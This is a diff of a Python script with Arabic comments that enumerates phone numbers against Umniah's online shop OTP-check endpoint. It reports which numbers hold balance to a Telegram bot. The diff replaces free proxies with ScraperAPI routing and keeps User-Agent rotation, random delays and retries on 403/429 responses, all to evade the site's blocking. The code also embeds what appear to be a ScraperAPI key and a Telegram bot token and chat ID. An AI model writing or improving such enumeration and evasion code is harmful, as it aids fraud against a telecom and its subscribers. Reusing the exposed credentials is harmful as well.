@@ -3,7 +3,7 @@ import time
 import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# قائمة User-Agents
+# User-Agents
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
@@ -15,21 +15,9 @@ USER_AGENTS = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
 ]
 
-# قائمة Proxies المجانية (جرب هذه أولاً)
-PROXIES_LIST = [
-    'http://95.216.194.71:8080',
-    'http://117.121.202.34:8080',
-    'http://200.24.67.98:8080',
-    'http://103.145.45.97:55443',
-    'http://45.132.185.75:80',
-    'http://185.21.101.157:80',
-    'http://104.18.55.155:80',
-    'http://47.254.32.173:8080',
-    'http://202.43.190.11:8080',
-    'http://52.15.102.93:80',
-    # أضف proxies إضافية من: https://www.proxy-list.download/
-    # أو: https://free-proxy-list.com/
-]
+# ⚙️ ScraperAPI Configuration
+SCRAPER_API_KEY = 'e42b050dcb697cf3ccd3d663edf43aea'  # ضع API Key هنا
+SCRAPER_API_URL = 'https://api.scraperapi.com/'
 
 BASE_COOKIES = {
     'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
@@ -57,29 +45,13 @@ TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4'
 TELEGRAM_CHAT_ID = '6873334348'
 TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
 
-# عدد الخيوط المتزامنة
-NUM_THREADS = 2
-
-# عدد المحاولات للأرقام الفاشلة
+# الإعدادات
+NUM_THREADS = 3
 MAX_RETRIES = 3
-
-# استخدام proxy أم لا
-USE_PROXY = True
 
 def get_random_user_agent():
     """الحصول على User-Agent عشوائي"""
     return random.choice(USER_AGENTS)
-
-def get_random_proxy():
-    """الحصول على Proxy عشوائي"""
-    if not USE_PROXY:
-        return None
-    
-    proxy = random.choice(PROXIES_LIST)
-    return {
-        'http': proxy,
-        'https': proxy
-    }
 
 def get_headers():
     """الحصول على headers مع User-Agent عشوائي"""
@@ -88,10 +60,10 @@ def get_headers():
     return headers
 
 def check_phone(phone_number, index, total, retry_count=0):
-    """فحص رقم واحد وإرسال النتيجة للبوت"""
+    """فحص رقم باستخدام ScraperAPI"""
     try:
         # تأخير عشوائي قبل الطلب
-        delay = random.uniform(2, 4)
+        delay = random.uniform(1, 2)
         time.sleep(delay)
         
         json_data = {
@@ -100,29 +72,31 @@ def check_phone(phone_number, index, total, retry_count=0):
             'orderid': '727165',
         }
         
-        # الحصول على headers و proxies عشوائية
         headers = get_headers()
-        proxies = get_random_proxy()
-        proxy_info = f" [Proxy: {list(proxies.values())[0][:30]}...]" if proxies else " [No Proxy]"
         
+        # الطريقة الصحيحة لـ ScraperAPI
+        payload = {
+            'api_key': SCRAPER_API_KEY,
+            'url': 'https://eshop.umniah.com/ar/vendic/index/checkotp/',
+        }
+        
+        # إرسال الطلب عبر ScraperAPI
         response = requests.post(
-            'https://eshop.umniah.com/ar/vendic/index/checkotp/', 
-            cookies=BASE_COOKIES,
-            headers=headers, 
-            json=json_data, 
-            timeout=15,
-            proxies=proxies,
-            allow_redirects=True
+            SCRAPER_API_URL,
+            params=payload,
+            headers=headers,
+            json=json_data,
+            timeout=20
         )
         
         if response.status_code == 200:
             try:
                 response_data = response.json()
             except:
-                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ في قراءة JSON{proxy_info}")
+                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ في قراءة JSON")
                 return ('json_error', phone_number, None)
             
-            # التحقق من data1 == success (يوجد رصيد)
+            # التحقق من data1 == success
             if response_data.get('data1') == 'success':
                 message = f"""
 ╔══════════════════════════════════╗
@@ -138,7 +112,7 @@ def check_phone(phone_number, index, total, retry_count=0):
 📊 الرقم: {index}/{total}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
-                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد{proxy_info}")
+                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد")
                 return ('success', phone_number, message)
             
             # التحقق من عدم وجود رصيد
@@ -158,18 +132,18 @@ def check_phone(phone_number, index, total, retry_count=0):
 📊 الرقم: {index}/{total}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
-                print(f"[{index}/{total}] ⚠️ {phone_number} - لا يوجد رصيد{proxy_info}")
+                print(f"[{index}/{total}] ⚠️ {phone_number} - لا يوجد رصيد")
                 return ('no_balance', phone_number, message)
             else:
-                print(f"[{index}/{total}] ❓ {phone_number} - رد: {response_data.get('data2', 'N/A')}{proxy_info}")
+                print(f"[{index}/{total}] ❓ {phone_number} - رد: {response_data.get('data2', 'N/A')}")
                 return ('retry', phone_number, None)
         
         elif response.status_code == 403 or response.status_code == 429:
-            print(f"[{index}/{total}] 🚫 {phone_number} - محظور (HTTP {response.status_code}) - محاولة {retry_count + 1}{proxy_info}")
+            print(f"[{index}/{total}] 🚫 {phone_number} - محظور (HTTP {response.status_code}) - محاولة {retry_count + 1}")
             return ('retry', phone_number, None)
         
         else:
-            print(f"[{index}/{total}] ❌ {phone_number} - HTTP {response.status_code}{proxy_info}")
+            print(f"[{index}/{total}] ❌ {phone_number} - HTTP {response.status_code}")
             if response.status_code >= 500:
                 return ('retry', phone_number, None)
             return ('http_error', phone_number, None)
@@ -179,7 +153,7 @@ def check_phone(phone_number, index, total, retry_count=0):
         return ('retry', phone_number, None)
     
     except requests.ConnectionError as e:
-        print(f"[{index}/{total}] 🔌 {phone_number} - فشل الاتصال: {str(e)[:30]}")
+        print(f"[{index}/{total}] 🔌 {phone_number} - فشل الاتصال")
         return ('retry', phone_number, None)
     
     except Exception as e:
@@ -215,7 +189,6 @@ def remove_from_file(phone_number):
         print(f"⚠️ فشل حذف {phone_number}: {str(e)}")
         return False
 
-# البرنامج الرئيسي
 def main():
     try:
         with open('lu1.txt', 'r', encoding='utf-8') as f:
@@ -231,7 +204,7 @@ def main():
         print(f"🚀 بدء الفحص بـ {NUM_THREADS} خيوط متزامنة...")
         print(f"🔄 عدد محاولات إعادة المحاولة: {MAX_RETRIES}")
         print(f"🎲 تغيير User-Agent عشوائياً: ✅")
-        print(f"🌐 استخدام Proxies: {'✅' if USE_PROXY else '❌'}")
+        print(f"🌐 استخدام ScraperAPI: ✅")
         print(f"⏳ تأخيرات عشوائية بين الطلبات: ✅\n")
         
         success_count = 0
@@ -240,7 +213,6 @@ def main():
         
         start_time = time.time()
         
-        # قائمة الأرقام المتبقية للمعالجة
         remaining_phones = phone_numbers.copy()
         attempt = 0
         
@@ -255,7 +227,6 @@ def main():
             with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
                 futures = {}
                 for idx, phone in enumerate(remaining_phones):
-                    # حساب الفهرس من الكل
                     original_idx = phone_numbers.index(phone) + 1 if phone in phone_numbers else idx
                     future = executor.submit(check_phone, phone, original_idx, total, attempt - 1)
                     futures[future] = phone
@@ -264,7 +235,7 @@ def main():
                     phone = futures[future]
                     
                     try:
-                        status, phone_num, message = future.result(timeout=25)
+                        status, phone_num, message = future.result(timeout=30)
                         
                         if status == 'success':
                             success_count += 1
@@ -279,12 +250,10 @@ def main():
                             remove_from_file(phone_num)
                         
                         elif status == 'retry':
-                            # أضف للقائمة للمحاولة مرة أخرى
                             if phone not in phones_to_retry:
                                 phones_to_retry.append(phone)
                         
                         else:
-                            # الأخطاء الأخرى - احذف الرقم
                             failed_count += 1
                             remove_from_file(phone_num)
                     
@@ -293,18 +262,15 @@ def main():
                         print(f"❌ خطأ في المعالجة: {str(e)}")
                         remove_from_file(phone)
             
-            # حدّث قائمة الأرقام المتبقية
             remaining_phones = phones_to_retry
             
-            # انتظر قبل المحاولة التالية
             if remaining_phones and attempt < MAX_RETRIES:
-                wait_time = random.uniform(8, 15)
+                wait_time = random.uniform(5, 10)
                 print(f"\n⏳ انتظار {wait_time:.1f} ثانية قبل المحاولة التالية...")
                 time.sleep(wait_time)
         
         elapsed_time = time.time() - start_time
         
-        # الإحصائيات
         print(f"\n{'='*60}")
         print(f"📊 النتائج النهائية:")
         print(f"{'='*60}")
